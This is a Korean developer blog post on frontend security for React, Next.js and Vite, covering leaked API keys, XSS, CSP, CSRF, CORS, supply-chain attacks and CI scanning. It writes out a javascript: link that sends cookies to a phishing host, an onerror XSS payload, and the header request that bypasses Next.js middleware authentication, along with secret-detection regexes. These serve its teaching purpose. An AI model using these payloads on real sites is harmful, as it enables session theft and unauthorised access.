---
title: 2026 Frontend Security Best Practices (작성중)
description: 2026 Frontend Security Best Practices
date: 06 11 2026
tags:
  - Journal
---

최근 TVing, Zara, 패스트캠퍼스 등 여러 기업에서 개인정보 유출 사고가 잇따라 발생하고 있습니다.

요즘 프론트엔드는 SSR, RSC 등 서버와 클라이언트를 모두 다루게 되면서, 보안 이슈가 그 어느 때보다 중요해졌습니다.

React, Next.js, npm 사례만 봐도, 보안 문제는 이제 남의 일이 아님을 알 수 있습니다.

이번 글에서는 프론트엔드 개발자가 꼭 알아야 할 보안 지식과 실전 체크포인트를 정리해보겠습니다.

---

## 목차

1. [Credential 유출](#1-credential-유출)
2. [XSS 공격](#2-xss-공격)
3. [CSP](#3-csp)
4. [인증 토큰 저장](#4-인증-토큰-저장)
5. [CSRF](#5-csrf)
6. [Next.js Server Component & Server Action 보안 모델](#6-nextjs-server-component--server-action-보안-모델)
7. [프레임워크 보안 업데이트: "나는 괜찮겠지"의 함정](#7-프레임워크-보안-업데이트-나는-괜찮겠지의-함정)
8. [의존성 공급망 공격 (Supply Chain Attack)](#8-의존성-공급망-공격-supply-chain-attack)
9. [보안 HTTP 헤더 체크리스트](#9-보안-http-헤더-체크리스트)
10. [CORS 설정: 와일드카드가 가져오는 재앙](#10-cors-설정-와일드카드가-가져오는-재앙)
11. [CI/CD 파이프라인에 보안 심기](#11-cicd-파이프라인에-보안-심기)
12. [프론트엔드 보안 감사 체크리스트](#12-프론트엔드-보안-감사-체크리스트)

---

## 1. Credential 유출

### Credential이 뭔가요?

**Credential(자격증명)** 이란 특정 서비스에 접근할 수 있는 열쇠입니다. API 키, 데이터베이스 접속 정보, OAuth 시크릿, AWS IAM 키 등이 모두 해당됩니다.

예를 들어, AWS 키 하나가 유출되면 수백만 원의 요금 폭탄, 전체 데이터베이스 탈취로 이어질 수 있습니다.

### 왜 프론트엔드에서 유출되나요?

우리의 코드는 번들링을 통해 웹 브라우저에서 사용이 되는데, 여기서 JS 번들이 문제입니다.

2024년 국내 보안 기업 `Cremit`이 국내 유명 웹사이트 70여 곳을 점검한 결과, [14곳(20%)에서 API 키가 JS 번들에 그대로 노출](https://www.cremit.io/ko/blog/credential-leakage-risks-hiding-in-frontend-code#%ED%98%84%EC%8B%A4%EC%97%90%EC%84%9C-%EC%9A%B0%EB%A6%AC%EB%8A%94-%EA%B3%84%EC%86%8D%ED%95%B4%EC%84%9C-%ED%81%AC%EB%A6%AC%EB%8D%B4%EC%85%9C-%EC%9C%A0%EC%B6%9C%EC%9D%84-%EB%B3%B4%EA%B3%A0%ED%95%98%EA%B3%A0-%EC%9E%88%EC%8A%B5%EB%8B%88%EB%8B%A4)됐습니다.

### `NEXT_PUBLIC_` prefix의 함정

Next.js의 `NEXT_PUBLIC_`에서 드러나듯이 PUBLIC, 즉 공개된 환경 변수입니다. 이것은 **"이 변수를 클라이언트에서 쓰겠다"는 선언**입니다.

[빌드 시점에 해당 값이 JS 파일 안에 문자열 그대로 대체](https://nextjs.org/docs/app/guides/environment-variables#runtime-environment-variables)되므로, 민감한 정보를 환경 변수로 저장해선 안됩니다.

```ts title="잘못된 환경 변수 사용"
// 코드에서는 이렇게 보이지만
const headers = {
  Authorization: `Bearer ${process.env.NEXT_PUBLIC_OPENAI_KEY}`,
};

// 빌드 후 번들(main-abc123.js)에서는 이렇게 됩니다
const headers = {
  Authorization: 'Bearer sk-proj-실제키값이여기에박힘',
  // → 누구나 DevTools로 볼 수 있음
};
```

[Vite도 마찬가지](https://ko.vite.dev/guide/env-and-mode#env-variables)입니다. `VITE_` prefix가 붙은 변수는 번들링 이후 클라이언트 측 소스 코드에 노출됩니다.

### 올바른 환경 변수 사용법

민감한 API KEY의 경우, NextJS의 Route Handler와 같이 Proxy 패턴을 사용하여 서버를 통해 요청해야 합니다.

`NEXT_PUBLIC_$`는 기본적으로 브라우저에 노출됨을 인지하고 사용하는 것이 중요합니다.

```ts title="API KEY 사용 사례"
// ❌ 클라이언트에서 직접 호출 → 키가 번들에 포함됨
async function summarize(text: string) {
  return fetch('https://api.openai.com/v1/chat/completions', {
    headers: { Authorization: `Bearer ${process.env.NEXT_PUBLIC_OPENAI_KEY}` },
  });
}

// ✅ 내 서버 Route를 경유 → 키는 서버에만 존재
// Client Component
async function summarize(text: string) {
  return fetch('/api/llm', {
    method: 'POST',
    body: JSON.stringify({ text }),
  });
}

// app/api/llm/route.ts (서버에서만 실행, 번들에 포함되지 않음)
export async function POST(req: Request) {
  const { text } = await req.json();
  return fetch('https://api.openai.com/v1/chat/completions', {
    headers: { Authorization: `Bearer ${process.env.OPENAI_KEY}` }, // NEXT_PUBLIC_ 없음
  });
}
```

### 현재 번들 점검하기

간단하게는 아래와 같이 `next.js`웹 사이트의 `NEXT_PUBLIC_`문자열을 찾아 조회해볼 수 있습니다.

`NEXT_PUBLIC_OPENAI_KEY`와 같은 민감한 정보가 있을 경우 그 즉시 교체 및 제거해야합니다.

```bash title="번들 내 NEXT_PUBLIC_ 조회"
SITE=https://www.sitename.com

for js in $(curl -s $SITE | grep -oE '/_next/static/[^"]+\.js' | sort -u); do
  curl -s "$SITE$js"
done \
| grep -aoE 'NEXT_PUBLIC_[A-Z0-9_]+' \
| sort -u
```

---

## 2. XSS 공격

### XSS란?

**XSS(Cross-Site Scripting)** 란 공격자가 내 웹 페이지에 악성 스크립트를 심어 다른 사용자의 브라우저에서 실행시키는 공격입니다.

예시로는 아래와 같은 순서로 발생할 수 있습니다.

> 1. 공격자가 댓글란에 `<script>document.cookie를 내 서버로 전송</script>` 입력
> 2. 다른 사용자가 해당 페이지를 열면 스크립트 실행
> 3. 공격자가 사용자의 세션 쿠키(로그인 정보) 탈취
> 4. 피해자 계정으로 로그인

### React가 막아주는 것

React는 JSX에서 변수를 렌더링할 때 HTML 특수문자를 자동으로 무력화합니다.

그래서 아래와 같은 경우, 스크립트가 실행되지 않고 문자 그대로 보여줍니다.

```tsx
const comment = '<script>alert("XSS")</script>';

// 스크립트 실행 안 됨
return <div>{comment}</div>;
```

### React가 막아주지 못하는 것

**① `dangerouslySetInnerHTML`**

이름을 `dangerouslySetInnerHTML`로 만든 이유는 말그대로 위험하니 사용에 주의하란 뜻입니다.

```tsx title="sanitize 예시"
// ❌ 사용자가 입력한 HTML을 그대로 렌더링 → XSS 취약
<div dangerouslySetInnerHTML={{ __html: userInput }} />;

// ✅ DOMPurify로 먼저 정화한 후 사용
import DOMPurify from 'dompurify';

<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />;
```

**② `href`에 사용자 입력 사용**

`javascript:` 프로토콜은 링크 클릭 시 스크립트를 실행합니다.

```tsx title="href에 http/https만 허용"
// 공격자가 href에 아래 값을 넣으면?
const url = 'javascript:document.location="https://피싱사이트.com?c="+document.cookie';

// ❌ 그대로 사용하면 클릭 시 쿠키 탈취
<a href={url}>이벤트 당첨 확인하기</a>;

// ✅ http/https만 허용
function isSafeUrl(url: string) {
  try {
    const { protocol } = new URL(url);
    return protocol === 'http:' || protocol === 'https:';
  } catch {
    return false;
  }
}
<a href={isSafeUrl(url) ? url : '#'}>{label}</a>;
```

**③ URL 파라미터를 DOM에 직접 삽입**

```ts title="DOM에 HTML 삽입 vs 안전한 텍스트 처리"
// ❌ URL의 name 파라미터를 HTML로 삽입
// 공격자가 ?name=<img src=x onerror=alert(1)> 같은 URL을 공유하면?
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting')!.innerHTML = `안녕하세요, ${name}님!`;

// ✅ textContent 사용 (HTML 파싱 없이 텍스트만 표시)
document.getElementById('greeting')!.textContent = `안녕하세요, ${name}님!`;
```

---

## 3. CSP

**CSP(Content Security Policy)** 는 브라우저에게 "이 페이지에서는 이런 것들만 실행/로드할 수 있다"고 알려주는 **보안 규칙서**입니다. HTTP 응답 헤더로 전달됩니다.

XSS 공격이 성공해서 악성 스크립트가 삽입됐더라도, CSP가 있으면 그 스크립트의 실행 자체를 브라우저가 차단합니다.

```md title="CSP 유무의 차이"
CSP 없는 경우:
공격자 스크립트 삽입 → 브라우저가 그냥 실행 → 쿠키 탈취, 악성 서버로 데이터 전송

CSP 있는 경우:
공격자 스크립트 삽입 → 브라우저가 "이 출처는 허용 안 됨" → 실행 차단
```

### Next.js에서 CSP 설정하기

정적 페이지가 많다면 `next.config.js`에서 간단하게 설정할 수 있습니다.

`unsafe-eval`의 경우 개발환경 디버깅을 위해 사용하므로 프로덕션 환경에서만 제거합니다.

```js title="next.config.js"
const isDev = process.env.NODE_ENV === 'development';

module.exports = {
  async headers() {
    return [{
      source: '/(.*)',
      headers: [{
        key: 'Content-Security-Policy',
        value: [
          "default-src 'self'",                          // 기본: 자기 도메인만 허용
          `script-src 'self' ${isDev ? "'unsafe-eval'" : ''}`, // 스크립트: 자기 도메인만
          "style-src 'self' 'unsafe-inline'",            // 스타일: 인라인 허용
          "img-src 'self' blob: data: https:",           // 이미지: https 전체 허용
          "object-src 'none'",                           // Flash 등 플러그인 완전 차단
          "frame-ancestors 'none'",                      // iframe 삽입 차단 (클릭재킹 방어)
          "upgrade-insecure-requests"                    // 요청을 https로 업그레이드하도록 지시
          ...
        ].join('; '),
      }],
    }];
  },
};
```

### 더 엄격한 설정: nonce 기반 CSP (권장)

`unsafe-inline`조차 없애고 싶다면 **nonce** 방식을 사용합니다. 매 요청마다 고유한 일회용 코드(nonce)를 발급하고, 그 코드가 있는 스크립트만 실행을 허용합니다.

CSP는 악성 스크립트를 차단하도록 설계되었지만, 인라인 스크립트가 필요한 합법적인 시나리오가 존재합니다. 이러한 경우 nonce를 사용하여 올바른 nonce를 가진 스크립트가 실행될 수 있도록 합니다.

아래는 [Next.js 공식 문서](https://nextjs.org/docs/app/guides/content-security-policy#adding-a-nonce-with-proxy)에서의 `proxy(middleware)`를 사용한 예시입니다.

```ts title="middleware.ts"
import { NextRequest, NextResponse } from 'next/server';

export function proxy(request: NextRequest) {
  const nonce = Buffer.from(crypto.randomUUID()).toString('base64');
  const isDev = process.env.NODE_ENV === 'development';
  const cspHeader = `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}' 'strict-dynamic'${isDev ? " 'unsafe-eval'" : ''};
    style-src 'self' 'nonce-${nonce}';
    img-src 'self' blob: data:;
    font-src 'self';
    object-src 'none';
    base-uri 'self';
    form-action 'self';
    frame-ancestors 'none';
    upgrade-insecure-requests;
`;
  // 줄바꿈 문자와 연속된 공백을 치환합니다
  const contentSecurityPolicyHeaderValue = cspHeader.replace(/\s{2,}/g, ' ').trim();

  const requestHeaders = new Headers(request.headers);
  requestHeaders.set('x-nonce', nonce);

  requestHeaders.set('Content-Security-Policy', contentSecurityPolicyHeaderValue);

  const response = NextResponse.next({
    request: {
      headers: requestHeaders,
    },
  });
  response.headers.set('Content-Security-Policy', contentSecurityPolicyHeaderValue);

  return response;
}
```

> **주의**: nonce 방식은 모든 페이지가 서버에서 동적으로 렌더링되어야 합니다. 정적 페이지가 많다면 위의 `next.config.js` 방식이 더 적합합니다.

### Vite SPA에서 CSP 설정 (Nginx)

Vite로 만든 SPA는 정적 파일이므로 서버(Nginx, CDN) 레벨에서 헤더를 설정합니다.

```nginx
# nginx.conf
server {
  add_header Content-Security-Policy
    "default-src 'self';
     script-src 'self';
     style-src 'self' 'unsafe-inline';
     img-src 'self' data: blob:;
     connect-src 'self' https://api.yourapp.com;
     frame-ancestors 'none';" always;
}
```

최신 버전에서는 `vite.config.js`설정으로도 [옵션](https://ko.vite.dev/guide/features#content-security-policy-csp)을 제공합니다.

### 위반 리포트 수집

CSP 설정 후 실제로 어떤 요청이 차단되는지 수집하면 설정을 점진적으로 개선할 수 있습니다.

```ts
// CSP 헤더에 report-uri 추가
Content-Security-Policy: default-src 'self'; report-uri /api/csp-report

// app/api/csp-report/route.ts
export async function POST(req: Request) {
  const report = await req.json();
  console.error('[CSP Violation]', JSON.stringify(report, null, 2));
  return new Response(null, { status: 204 });
}
```

---

## 4. 인증 토큰 저장

로그인 후 받은 토큰(JWT 등)을 어디에 저장하느냐에 따라 노출되는 공격이 달라집니다.

XSS와 CSRF, 두 가지 공격 사이에서 균형을 맞춰야 합니다.

### 저장소별 비교

| 저장소               | XSS                      | CSRF    | 특징                                   |
| -------------------- | ------------------------ | ------- | -------------------------------------- |
| `localStorage`       | ❌ 취약 (JS로 접근 가능) | ✅ 안전 | 새로고침 유지. **민감 토큰 사용 금지** |
| `sessionStorage`     | ❌ 취약 (JS로 접근 가능) | ✅ 안전 | 탭 닫으면 삭제                         |
| `HttpOnly Cookie`    | ✅ 안전 (JS 접근 불가)   | ❌ 취약 | SameSite 설정으로 보완                 |
| 메모리 (React state) | ✅ 안전                  | ✅ 안전 | 새로고침 시 로그아웃됨                 |

### 권장 패턴: HttpOnly Cookie

`HttpOnly` 속성이 붙은 쿠키는 JavaScript에서 `document.cookie`로 읽을 수 없습니다.

Next Server를 Proxy로 사용할 경우 아래와 같이 설정할 수 있습니다.

```ts title="/api/auth.ts"
export async function POST(req: Request) {
  const token = await authenticate(req);

  return new Response(JSON.stringify({ success: true }), {
    headers: {
      'Set-Cookie': [
        `auth_token=${token}`,
        'HttpOnly', // JS에서 접근 불가 → XSS 방어
        'Secure', // HTTPS에서만 전송
        'SameSite=Strict', // 같은 사이트 요청에서만 전송 → CSRF 방어
        'Max-Age=604800', // 7일
        'Path=/',
      ].join('; '),
    },
  });
}
```

---

## 5. CSRF

**CSRF(Cross-Site Request Forgery)** 는 로그인된 사용자를 속여 의도하지 않은 요청을 보내게 만드는 공격입니다.

```md title="CSRF 공격 시나리오"
1. 사용자가 은행 사이트에 로그인된 상태
2. 공격자가 만든 피싱 페이지를 사용자가 방문
3. 그 페이지에 숨겨진 폼이 자동으로 은행 서버에 송금 요청을 보냄
4. 은행 서버는 "인증된 쿠키가 있으니 정상 요청"으로 처리
```

### Next.js Server Action의 CSRF 방어

Next.js App Router의 Server Action은 [두 가지를 자동으로 처리](https://nextjs.org/blog/security-nextjs-server-components-actions#csrf)합니다.

- **POST 전용**: Server Action은 항상 POST로만 호출됩니다.
- **Origin 헤더 검증**: 요청의 `Origin`과 `Host`가 다르면 자동으로 거부합니다.

하지만 Custom Route Handler의 경우 별도의 대응이 필요합니다.

```ts title="/api/transfer/route.ts"
// ❌ 아무 검증 없이 처리하면 CSRF 취약
export async function POST(req: Request) {
  const { amount, to } = await req.json();
  await transferMoney(amount, to);
}
```

```ts title="/api/transfer/route.ts"
// ✅ Origin 헤더를 직접 검증
export async function POST(req: Request) {
  const origin = req.headers.get('origin');
  const allowedOrigins = ['https://yourapp.com'];

  if (!origin || !allowedOrigins.includes(origin)) {
    return new Response('Forbidden', { status: 403 });
  }

  const { amount, to } = await req.json();
  await transferMoney(amount, to);
}
```

이런 경우는 잘 없지만, 아래와 같이 `GET`요청으로 상태를 변경해선 안됩니다.

```ts
// ❌ 공격자가 <img src="https://yourapp.com/api/delete?id=123"> 하나로 공격 가능
app.get('/api/user/delete', deleteUser);

// ✅ 상태 변경은 반드시 POST, PUT, DELETE 사용
app.delete('/api/user/:id', deleteUser);
```

---

## 6. Next.js Server Component & Server Action 보안 모델

프론트엔드에서 주의해야하는 것은 서버에서 실행된다고 항상 안전한 것은 아닙니다.

`Server Component`와 `Server Action`은 서버에서 실행되지만, 실수로 민감한 데이터를 클라이언트로 넘기거나 권한 검증을 빠뜨리면 여전히 취약합니다.

### Data Access Layer 패턴

DB 접근 코드가 이곳저곳에 흩어지면 보안을 검사하기 어려워집니다.

```ts
// data/auth.ts — 서버 전용 모듈
import 'server-only'; // ← 이 한 줄이 Client Component에서의 import를 빌드 에러로 막아줌
import { cache } from 'react';
import { cookies } from 'next/headers';

export const getCurrentUser = cache(async () => {
  const token = (await cookies()).get('auth_token')?.value;
  if (!token) return null;
  return validateToken(token); // 검증 후 반환
});
```

```ts
// data/posts.ts
import 'server-only';
import { getCurrentUser } from './auth';

export async function getPost(id: string) {
  const user = await getCurrentUser();
  if (!user) throw new Error('로그인이 필요합니다');

  const post = await db.post.findUnique({ where: { id } });
  if (!post) return null;

  // ✅ 필요한 필드만 반환 (DB의 모든 컬럼을 그대로 넘기지 않음)
  return {
    id: post.id,
    title: post.title,
    content: post.content,
    // authorEmail, internalNotes 등 민감한 필드는 제외
  };
}
```

### Server Action에서 입력값 검증

`"use server"` 함수는 사실상 **외부에 공개된 API 엔드포인트**입니다. TypeScript 타입은 런타임에 검증되지 않으므로 항상 직접 검증하세요.

```ts
// app/actions/posts.ts
'use server';
import { z } from 'zod';

const schema = z.object({ id: z.string().uuid() });

export async function deletePost(formData: FormData) {
  // 1단계: 인증 확인
  const user = await getCurrentUser();
  if (!user) throw new Error('Unauthorized');

  // 2단계: 입력값 검증 (TypeScript만으론 부족)
  const result = schema.safeParse({ id: formData.get('id') });
  if (!result.success) throw new Error('잘못된 입력값');

  // 3단계: 권한 확인 (내 글인지 확인)
  const post = await db.post.findUnique({ where: { id: result.data.id } });
  if (post?.authorId !== user.id) throw new Error('Forbidden');

  await db.post.delete({ where: { id: result.data.id } });
}
```

### Client Component에 데이터를 넘길 때 최소화

```tsx
// ❌ user 객체 전체를 넘기면 password hash, phone 등도 클라이언트에 노출될 수 있음
const user = await db.user.findUnique({ where: { id } });
return <ProfileCard user={user} />;

// ✅ 필요한 것만 넘기기
const user = await db.user.findUnique({ where: { id } });
return <ProfileCard name={user.name} avatarUrl={user.avatarUrl} />;
```

---

## 7. 프레임워크 보안 업데이트: "나는 괜찮겠지"의 함정

많은 개발자들이 "내가 쓰는 React/Next.js는 안정적인 버전이니 괜찮겠지"라고 생각합니다. 하지만 2025년은 이 생각이 얼마나 위험한지를 보여준 해였습니다.

### 사례 1: Next.js 미들웨어 인증 우회 (CVE-2025-29927)

**발생 시기**: 2025년 3월  
**심각도**: CVSS 9.1 (Critical)  
**영향 버전**: Next.js 11.1.4 ~ 15.2.2 (수년치의 버전이 전부 취약)

Next.js는 미들웨어가 자기 자신을 무한 호출하는 걸 막기 위해 내부적으로 `x-middleware-subrequest`라는 헤더를 사용합니다. "이 헤더가 있으면 내부 요청이니 미들웨어를 건너뛰자"는 로직이었는데, **공격자가 이 헤더를 직접 만들어 붙이면 미들웨어 실행이 완전히 건너뛰어졌습니다.**

```
# 공격자가 이 요청 한 줄로 인증을 완전히 우회
GET /admin/dashboard HTTP/1.1
Host: yourapp.com
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

미들웨어에서 인증을 처리하던 수천 개의 서비스가 단 하나의 헤더 조작으로 인증을 우회당했습니다. **패치 버전으로 업데이트하는 것만이 해결책이었습니다.**

이 취약점이 중요한 이유가 또 있습니다. 많은 개발자들이 Next.js 미들웨어에서 인증 처리를 하고 페이지 라우터에서는 별도로 검증하지 않는 패턴을 사용하는데, 이런 경우 단일 우회로 인한 피해가 전체로 확산될 수 있습니다.

> **교훈**: 미들웨어는 "1차 관문"일 뿐입니다. 민감한 API나 페이지에서는 **서버 사이드에서도 반드시 인증을 재확인**하세요.

### 사례 2: React Server Components RCE (CVE-2025-55182)

**발생 시기**: 2025년 12월  
**심각도**: CVSS 10.0 (최고 등급)  
**영향 버전**: React 19.0 ~ 19.2, Next.js App Router 사용 버전

React Server Components의 Flight 프로토콜에서 발견된 취약점으로, **인증 없이 HTTP 요청 하나만으로 서버에서 임의 코드를 실행**할 수 있었습니다. (RCE: Remote Code Execution)

공개 직후 실제 공격이 관측됐습니다. 클라우드 자격증명 탈취, 암호화폐 채굴 악성코드(XMRig) 설치가 보고됐고 중국 국가안전부와 연계된 것으로 추정되는 APT 그룹의 공격도 포함됐습니다.

```bash
# 즉시 업데이트
npm install next@latest
npm install react@latest react-dom@latest
```

이 취약점은 초기 패치 이후에도 추가 취약점(CVE-2025-55183, CVE-2025-55184, CVE-2026-23864)이 연속으로 발견됐습니다. **"패치 한 번"으로 끝나지 않았습니다.**

### 보안 업데이트를 놓치지 않는 방법

**① GitHub Security Advisories 구독**

```
https://github.com/vercel/next.js/security/advisories
https://github.com/facebook/react/security/advisories
```

저장소를 Watch → Security Alerts로 설정하면 이메일 알림을 받을 수 있습니다.

**② Dependabot 설정**

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: 'npm'
    directory: '/'
    schedule:
      interval: 'weekly'
    # 보안 업데이트는 즉시 PR 생성
    open-pull-requests-limit: 10
```

Dependabot은 GitHub Security Advisory에 등록된 취약점을 감지하면 **자동으로 패치 PR**을 만들어줍니다.

**③ `npm audit`을 CI에 포함**

```yaml
# .github/workflows/ci.yml
- name: Security audit
  run: npm audit --audit-level=high
  # high 이상 취약점 발견 시 빌드 실패
```

**④ 현재 버전 취약점 즉시 확인**

```bash
# 지금 사용 중인 패키지의 알려진 취약점 확인
npm audit

# 어떤 버전이 영향받는지 상세 확인
npm audit --json | jq '.vulnerabilities'
```

---

## 8. 의존성 공급망 공격 (Supply Chain Attack)

### 공급망 공격이 뭔가요?

여러분이 직접 쓴 코드가 아니라, **설치한 npm 패키지 안에 악성 코드가 들어있는 경우**입니다.

2025년 9월, chalk, debug, ansi-styles 등 주간 합산 **26억 다운로드**에 달하는 18개 인기 패키지가 동시에 탈취됐습니다. 공격자가 메인테이너 계정을 피싱으로 탈취한 뒤 악성 버전을 배포한 것입니다. 2026년 3월에는 전체 클라우드 환경의 80%에 설치된 `axios`가 같은 방식으로 침해됐습니다.

이 패키지들이 내 프로젝트에 들어있다면 나도 당했을 수 있습니다.

### 방어 방법

**① lockfile 커밋 + `npm ci` 사용**

```bash
# lockfile(package-lock.json)은 반드시 git에 커밋
git add package-lock.json

# CI에서는 npm install 대신 npm ci 사용
# npm ci: lockfile을 엄격하게 따름, 범위(^, ~) 재해석 안 함
npm ci
```

**② 취약점 스캔**

```bash
# 알려진 취약점 확인
npm audit

# 심각도 높은 취약점 발견 시 CI 빌드 실패
npm audit --audit-level=high
```

**③ 의심스러운 패키지 주의**

```
타이포스쿼팅 예시 (진짜 패키지와 헷갈리게 만든 악성 패키지):
lodahs      ← lodash
recat       ← react
expres      ← express
```

설치 전에 패키지 이름 오타, 다운로드 수, 최근 업데이트 날짜를 확인하세요.

---

## 9. 보안 HTTP 헤더 체크리스트

HTTP 응답 헤더 몇 줄만 추가해도 여러 공격을 한 번에 차단할 수 있습니다.

### Next.js 전체 설정

```js
// next.config.js
module.exports = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          // iframe으로 내 페이지를 삽입하는 클릭재킹 공격 차단
          { key: 'X-Frame-Options', value: 'DENY' },

          // 브라우저가 파일 타입을 임의로 추측하는 것 방지
          // (txt 파일을 JS로 실행하는 공격 차단)
          { key: 'X-Content-Type-Options', value: 'nosniff' },

          // 외부 사이트로 이동 시 URL 경로를 Referer 헤더에 포함하지 않음
          { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },

          // 이후 모든 요청을 HTTPS로 강제 (1년간)
          { key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains' },

          // 불필요한 브라우저 기능 비활성화
          { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
        ],
      },
    ];
  },
};
```

### 각 헤더 한 줄 요약

| 헤더                              | 방어하는 공격                                       |
| --------------------------------- | --------------------------------------------------- |
| `X-Frame-Options: DENY`           | 클릭재킹 (내 페이지를 투명 iframe에 올려 클릭 유도) |
| `X-Content-Type-Options: nosniff` | MIME 타입 스니핑                                    |
| `Strict-Transport-Security`       | HTTP 연결 강제(중간자 공격)                         |
| `Referrer-Policy`                 | 내부 URL이 외부로 노출되는 것 방지                  |
| `Permissions-Policy`              | 카메라/마이크 등 민감한 기능 오남용                 |
| `Content-Security-Policy`         | XSS, 악성 스크립트 로드 (섹션 3 참고)               |

### 지금 내 사이트 점수 확인

[securityheaders.com](https://securityheaders.com)에 도메인을 입력하면 현재 헤더 설정을 분석하고 등급(A+~F)을 알려줍니다. 목표는 A 이상입니다.

---

## 10. CORS 설정: 와일드카드가 가져오는 재앙

### CORS가 뭔가요?

**CORS(Cross-Origin Resource Sharing)** 는 "어떤 사이트에서 내 API를 호출할 수 있는지"를 서버가 브라우저에게 알려주는 메커니즘입니다.

`Access-Control-Allow-Origin: *`는 **전 세계 모든 사이트가 내 API를 호출할 수 있다**는 뜻입니다.

### 왜 위험한가

```
공격 시나리오 (CORS: * 설정 시):
1. 사용자가 evil.com 방문 (악성 사이트)
2. evil.com의 스크립트가 yourapi.com/user/data 호출
3. CORS: * 이므로 브라우저가 요청 허용
4. 사용자의 데이터가 evil.com으로 전달됨
```

### 올바른 CORS 설정

```ts
// Next.js Route Handler
const ALLOWED_ORIGINS = [
  'https://yourapp.com',
  'https://www.yourapp.com',
  // 개발 환경에서만 localhost 허용
  ...(process.env.NODE_ENV === 'development' ? ['http://localhost:3000'] : []),
];

export async function GET(request: Request) {
  const origin = request.headers.get('origin') ?? '';
  const isAllowed = ALLOWED_ORIGINS.includes(origin);

  return Response.json(
    { data: '...' },
    {
      headers: isAllowed
        ? {
            'Access-Control-Allow-Origin': origin, // * 대신 명시적 origin
            'Access-Control-Allow-Credentials': 'true',
            Vary: 'Origin', // 캐시가 origin별로 분리되도록
          }
        : {},
    },
  );
}
```

### Vite 개발 서버의 proxy 설정

```ts
// vite.config.ts
// 개발 환경에서만 사용하는 CORS 우회 방법
export default defineConfig({
  server: {
    proxy: {
      '/api': {
        target: 'http://localhost:8080',
        changeOrigin: true,
      },
    },
  },
});
// ⚠️ 이 설정은 개발용입니다. 프로덕션에서는 서버에 CORS 설정이 필요합니다.
```

---

## 11. CI/CD 파이프라인에 보안 심기

보안 점검은 배포 직전 한 번만 하는 게 아니라, **코드가 변경될 때마다 자동으로 실행**되어야 합니다.

```yaml
# .github/workflows/security.yml
name: Security Checks

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: npm ci # npm install 대신 ci 사용

      # 1. 의존성 취약점 검사
      - name: Dependency audit
        run: npm audit --audit-level=high

      # 2. 시크릿 노출 검사 (코드 안에 API 키 등이 있는지 확인)
      - name: Secret scanning
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          head: HEAD

      # 3. 빌드
      - name: Build
        run: npm run build

      # 4. 빌드된 번들에 시크릿이 포함됐는지 최종 확인
      - name: Scan built bundle
        run: |
          SECRET_FOUND=false
          for file in $(find .next/static -name "*.js" 2>/dev/null); do
            if grep -qE 'AKIA[0-9A-Z]{16}|sk_live_[a-zA-Z0-9]+|ghp_[a-zA-Z0-9]{36}' "$file"; then
              echo "❌ Secret found in: $file"
              SECRET_FOUND=true
            fi
          done
          if [ "$SECRET_FOUND" = true ]; then exit 1; fi
          echo "✅ No secrets found in bundle"
```

### ESLint 보안 규칙 추가

```bash
npm install --save-dev eslint-plugin-security
```

```js
// eslint.config.js
import pluginSecurity from 'eslint-plugin-security';

export default [
  pluginSecurity.configs.recommended,
  {
    rules: {
      'react/no-danger': 'error', // dangerouslySetInnerHTML 사용 금지
      'no-eval': 'error', // eval() 사용 금지
      'no-implied-eval': 'error',
    },
  },
];
```

---

## 12. 프론트엔드 보안 감사 체크리스트

PR 리뷰나 정기 점검 시 이 체크리스트를 활용하세요.

### 🔑 Credential 관리

- [ ] `NEXT_PUBLIC_` / `VITE_` prefix 환경변수에 민감한 값(API 키, 시크릿)이 없다
- [ ] 빌드된 JS 번들을 실제로 열어봤을 때 키가 포함되어 있지 않다
- [ ] 소스맵 파일이 외부에서 접근 가능하지 않다
- [ ] `.env` 파일이 `.gitignore`에 등록되어 있고 git에 올라가 있지 않다

### 🛡️ XSS 방어

- [ ] `dangerouslySetInnerHTML` 사용 시 DOMPurify로 sanitize하고 있다
- [ ] 사용자 입력이 `href`, `src`에 들어갈 때 URL 검증을 한다
- [ ] `innerHTML`, `document.write`를 직접 사용하지 않는다
- [ ] CSP 헤더가 설정되어 있다

### 🍪 인증 & 세션

- [ ] Refresh Token을 `localStorage`가 아닌 `HttpOnly Cookie`에 저장한다
- [ ] 쿠키에 `HttpOnly`, `Secure`, `SameSite` 속성이 설정되어 있다
- [ ] 로그아웃 시 서버에서도 토큰을 무효화한다

### 🔄 CSRF 방어

- [ ] 상태 변경 API에 GET 요청을 사용하지 않는다
- [ ] Custom Route Handler에서 Origin 헤더를 검증한다

### 🏗️ Next.js 전용

- [ ] `server-only` 패키지로 민감한 모듈이 클라이언트에서 import되는 것을 막고 있다
- [ ] Server Action에서 사용자 인증과 입력값 검증을 하고 있다
- [ ] Client Component props에 민감한 데이터가 포함되지 않는다

### 🔖 프레임워크/라이브러리 업데이트

- [ ] React, Next.js, Vite의 최신 보안 패치 버전을 사용하고 있다
- [ ] GitHub Security Advisories 알림을 구독하고 있다
- [ ] Dependabot 또는 Renovate로 자동 업데이트 PR을 받고 있다
- [ ] `npm audit`을 주기적으로 실행하고 있다 (또는 CI에 포함됨)

### 📦 의존성

- [ ] `package-lock.json` (또는 `yarn.lock`, `pnpm-lock.yaml`)이 커밋되어 있다
- [ ] CI에서 `npm install` 대신 `npm ci`를 사용한다
- [ ] 새 패키지 설치 전에 이름 오타, 다운로드 수를 확인한다

### 🌐 HTTP 헤더 & CORS

- [ ] `X-Frame-Options`, `X-Content-Type-Options`, `HSTS` 헤더가 설정되어 있다
- [ ] CORS에 `Access-Control-Allow-Origin: *`를 사용하지 않는다
- [ ] [securityheaders.com](https://securityheaders.com) 기준 A 등급 이상이다

---

## 마치며

프론트엔드 보안은 "백엔드에서 알아서 막겠지"라는 생각이 통하던 시대가 지났습니다.

